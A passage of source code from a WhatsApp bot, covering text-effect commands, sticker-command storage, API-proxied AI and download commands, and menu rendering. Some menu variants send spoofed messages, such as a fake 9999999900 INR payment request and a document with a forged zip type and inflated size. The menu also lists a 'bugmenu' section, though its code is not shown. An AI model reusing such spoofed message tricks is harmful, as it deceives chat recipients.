if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
nyanBot2.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'setcmd': {
                if (!m.quoted) return reply('Reply Message!')
                if (!m.quoted.fileSha256) return reply('SHA256 Hash Missing')
                if (!text) return reply(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return reply('You have no permission to change this sticker command')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                reply(`Done!`)
            }
            break
case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return reply(`No hashes`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return reply('You have no permission to delete this sticker command')             
                delete global.db.data.sticker[hash]
                reply(`Done!`)
            }
            break
case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                nyanBot2.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
                if (!isSamu) return StickOwner()
                if (!m.quoted) return reply('Reply Message!')
                if (!m.quoted.fileSha256) return reply('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return reply('Hash not found in database')
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                reply('Done!')
            }
            break
            case 'ss': case 'ssweb': {
if (!q) return reply(`Example ${prefix+command} link`)
await StickWait()
let krt = await scp2.ssweb(q)
nyanBot2.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case 'pickupline': {
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
    reply(pickupLine)
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break
  case 'animequote': {
  try {
    const res = await fetch('https://some-random-api.com/animu/quote');
    if (!res.ok) throw await res.text()
    const json = await res.json()
    const { sentence, character, anime } = json
    const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`
    nyanBot2.sendMessage(m.chat, { text: message }, 'extendedTextMessage', { quoted: m })
  } catch (error) {
    console.error(error)
  }
  }
  break
  case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    reply(bibleChapter)
  } catch (error) {
    reply(`Error: ${error.message}`)
  }
  }
  break
  case 'dalle': {
  if (!text) return reply(`*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${prefix + command} Beautiful anime girl*\n*${prefix + command} girl in pink dress*`)
  try {
  	reply('*Please wait, generating image...*')
    const endpoint = `https://cute-tan-gorilla-yoke.cyclic.app/imagine?text=${encodeURIComponent(text)}`
    const response = await fetch(endpoint)
    if (response.ok) {
      const imageBuffer = await response.buffer()
      await nyanBot2.sendMessage(m.chat, { image: imageBuffer }, {quoted: m})
    } else {
      throw '*Image generation failed*';
    }
  } catch {
    reply('*Oops! Something went wrong while generating images. Please try again later.*')
  }
  }
  break
  case 'translate':{
  	if (!q) return reply(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       reply(result.text)
    } catch (e) {
        return reply(err)
    } 
    }
    break
    case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    reply(quranSurah)

    if (json.data.recitation.full) {
      nyanBot2.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    reply(`Error: ${error.message}`)
  }
  }
  break
  case 'mediafire': {
  	if (!args[0]) return reply(`Enter the mediafire link next to the command`)
    if (!args[0].match(/mediafire/gi)) return reply(`Link incorrect`)
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = `
   ≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim()
    nyanBot2.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
    }
    break
    case 'tagadmin': case 'listadmin': case 'admin':{
    	if (!m.isGroup) return StickGroup()
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Group Admins:*
${listAdmin}
`.trim()
    nyanBot2.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break
case 'instagram': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return reply(`You need to give the URL of Any Instagram video, post, reel, image`)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return reply(`An error occurred: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return reply(`No video or image found or Invalid response from API.`)
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `HERE IS THE ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
      nyanBot2.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted: m})
    } else if (mediaType === 'image') {
      nyanBot2.sendMessage(m.chat, { image: {url: mediaURL}, caption: cap}, {quoted: m})
    }
  }
}
break
case 'apk':
case 'apkdl':{
if (!text) return reply("What apk u wanna download?")
let resxeon = await fetch(`https://vihangayt.me/download/apk?id=${text}`)
let jsonxeon = await resxeon.json()
nyanBot2.sendMessage(from, { document: { url: jsonxeon.data.dllink}, fileName : jsonxeon.data.name, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
.catch(console.error)
}
break
case 'mathsai': {
                if (!text) return reply('What is your question?')
                let d = await fetchJson(`https://vihangayt.me/tools/mathssolve?q=${text}`)                
                reply(d.data)
           }
            break
            case 'blackboxai': {
                if (!text) return reply('What is your question?')
                let d = await fetchJson(`https://vihangayt.me/tools/blackboxv4?q=${text}`)                
                reply(d.data)
           }
            break
            case 'bardai': {
                if (!text) return reply('What is your question?')
                let d = await fetchJson(`https://vihangayt.me/tools/bard?q=${text}`)                
                reply(d.data)
           }
            break
            case 'photoleapai': {
	if (!text) return reply('What is your question?')
	let xeonfetch = await fetchJson(`https://vihangayt.me/tools/photoleap?q=${text}`)
	nyanBot2.sendMessage(from, { image: {url:xeonfetch.data}}, { quoted: m })
	}
	break
	case 'lamaai': {
                if (!text) return reply('What is your question?')
                let d = await fetchJson(`https://vihangayt.me/tools/llama-2?q=${text}`)                
                reply(d.data)
           }
            break
            case 'geminiai': {
                if (!text) return reply('What is your question?')
                let d = await fetchJson(`https://vihangayt.me/tools/gemini?q=${text}`)                
                reply(d.data)
           }
            break
case 'itunes': {
if (!text) return reply('Please provide a song name')
  try {
    let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let songInfo = 
    `*Song Information:*\n
     • *Name:* ${json.name}\n
     • *Artist:* ${json.artist}\n
     • *Album:* ${json.album}\n
     • *Release Date:* ${json.release_date}\n
     • *Price:* ${json.price}\n
     • *Length:* ${json.length}\n
     • *Genre:* ${json.genre}\n
     • *URL:* ${json.url}`
    // Check if thumbnail is present, then send it with songInfo as caption
    if (json.thumbnail) {
      await nyanBot2.sendMessage(m.chat, {image: {url:json.thumbnail}, caption: songInfo}, {quoted: m})
    } else {
      reply(songInfo)
    }
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
}
break
case 'ttp':
if (args.length == 0) return reply(`Example: ${prefix + command} dgxeon`)
dgxeontks = args.join(" ")
dgxeonvuff = await getBuffer(`https://vihangayt.me/maker/text2img?q=${dgxeontks}`)
nyanBot2.sendImageAsSticker(m.chat, dgxeonvuff, m, {
                        packname: packname,
                        author: author
                    })
break
case 'attp':
if (args.length == 0) return reply(`Example: ${prefix + command} dgxeon`)
dgxeontks2 = args.join(" ")
dgxeonvuff2 = await getBuffer(`https://vihangayt.me/maker/text2gif?q=${dgxeontks2}`)
nyanBot2.sendImageAsSticker(m.chat, dgxeonvuff2, m, {
                        packname: packname,
                        author: author
                    })
break
case 'blur':
  case 'blurimg': {
 if (!isMedia) return reply("Where Is The Image")
                let media = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                nyanBot2.sendMessage(m.chat, {
                    image: { url: `https://vihangayt.me/maker/blur?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
            break
            case 'beautiful':
  case 'beautifulimg': {
 if (!isMedia) return reply("Where Is The Image")
                let media = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                nyanBot2.sendMessage(m.chat, {
                    image: { url: `https://vihangayt.me/maker/beautiful?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
            break
            case 'facepalm':
  case 'facepalmimage': {
 if (!isMedia) return reply("Where Is The Image")
                let media = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                nyanBot2.sendMessage(m.chat, {
                    image: { url: `https://vihangayt.me/maker/facepalm?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
            break
            case 'invert':
  case 'invertimage': {
 if (!isMedia) return reply("Where Is The Image")
                let media = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                nyanBot2.sendMessage(m.chat, {
                    image: { url: `https://vihangayt.me/maker/invert?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
            break
            case 'pixelate':
  case 'pixelateimage': {
 if (!isMedia) return reply("Where Is The Image")
                let media = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                nyanBot2.sendMessage(m.chat, {
                    image: { url: `https://vihangayt.me/maker/pixelate?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
            break
            case 'rainbow':
  case 'rainbowimage': {
 if (!isMedia) return reply("Where Is The Image")
                let media = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                nyanBot2.sendMessage(m.chat, {
                    image: { url: `https://vihangayt.me/maker/rainbow?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
            break
            case 'trigger':
  case 'triggerimage': {
 if (!isMedia) return reply("Where Is The Image")
                let media = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                nyanBot2.sendMessage(m.chat, {
                    image: { url: `https://vihangayt.me/maker/trigger?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
            break
            case 'wanted':
  case 'wantedimage': {
 if (!isMedia) return reply("Where Is The Image")
                let media = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                nyanBot2.sendMessage(m.chat, {
                    image: { url: `https://vihangayt.me/maker/wanted?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
            break
            case 'wasted':
  case 'wastedimage': {
 if (!isMedia) return reply("Where Is The Image")
                let media = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                nyanBot2.sendMessage(m.chat, {
                    image: { url: `https://vihangayt.me/maker/wasted?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
            break
            case 'carbon':
  case 'carbonimage': {
 if (!text) return reply('Where is the text?')
                nyanBot2.sendMessage(m.chat, {
                    image: { url: `https://vihangayt.me/maker/carbonimg?q=${text}` },caption: "Here you go!" }, { quoted: m}) }
            break
            case 'colorize': {
 if (!isMedia) return reply("Where Is The Image")
                let media = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                nyanBot2.sendMessage(m.chat, {
                    image: { url: `https://vihangayt.me/tools/colorize?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
            break
            case 'enhance': {
 if (!isMedia) return reply("Where Is The Image")
                let media = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                nyanBot2.sendMessage(m.chat, {
                    image: { url: `https://vihangayt.me/tools/enhance?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
            break
            case 'dehaze': {
 if (!isMedia) return reply("Where Is The Image")
                let media = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                nyanBot2.sendMessage(m.chat, {
                    image: { url: `https://vihangayt.me/tools/dehaze?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
            break
           
  case 'totalfeature':
        case 'totalfitur': 
        case 'totalcmd': 
        case 'totalcommand': 
            reply(`Total Features of ${botname} is ${xeonfeature()}`)
        break
            case 'menu':
            case 'help': {
            let ownernya = ownernumber + '@s.whatsapp.net'
            let timestampe = speed()
            let latensie = speed() - timestampe
            let a = db.data.users[sender]
            let me = m.sender
            let xmenu_oh = `┌─❖
│ Hi 👋 
└┬❖  ${pushname} 
┌┤✑  ${timeNow} 😄${readmore} 
│└────────────┈ ⳹
│
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊 
│𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
│𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
│𝗕𝗼𝘁 : ${botname}
│𝗢𝘄𝗻𝗲𝗿 𝗡𝗼: +${ownernumber}
│𝗣𝗿𝗲𝗳𝗶𝘅 :  [ ${xprefix} ]
│𝗠𝗼𝗱𝗲 : ${nyanBot2.public ? 'Public' : `Self`}
│𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${os.hostname()}
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
│𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length} User
│𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 : ${global.db.data.settings[botNumber].totalhit} Hit
│𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝘁 : ${Object.keys(global.db.data.chats).length} Chat/Gc
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊
│𝗡𝗮𝗺𝗲 : ${pushname}
│𝗡𝘂𝗺𝗯𝗲𝗿 : +${me.split('@')[0]}
│𝗟𝗶𝗺𝗶𝘁 : ${a.limit}
│𝗧𝗶𝘁𝗹𝗲 : ${a.title ? a.title : '-'}
│𝗦𝗲𝗿𝗶𝗮𝗹: ${a.serialNumber}
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│??𝗶𝗺𝗲 : ${xtime}
│𝗗𝗮𝘁𝗲 : ${xdate}
└┬───────────────── ⳹
   │✑  Please Type The *MENU*
   │✑  Given *BELOW*
┌└─────────────┈ ⳹
│❏${xprefix}allmenu
│❏${xprefix}downloadmenu
│❏${xprefix}funmenu
│❏${xprefix}aimenu
│❏${xprefix}groupmenu
│❏${xprefix}ownermenu
│❏${xprefix}photooxymenu
│❏${xprefix}ephoto360menu
│❏${xprefix}makermenu
│❏${xprefix}animemenu
│❏${xprefix}nsfwmenu
│❏${xprefix}randomphotomenu
│❏${xprefix}randomvideomenu
│❏${xprefix}stickermenu
│❏${xprefix}databasemenu
│❏${xprefix}stalkermenu
│❏${xprefix}bugmenu
│❏${xprefix}othermenu
└─────────────────┈ ⳹`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
            case 'allmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${allmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
            case 'ownermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${ownermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
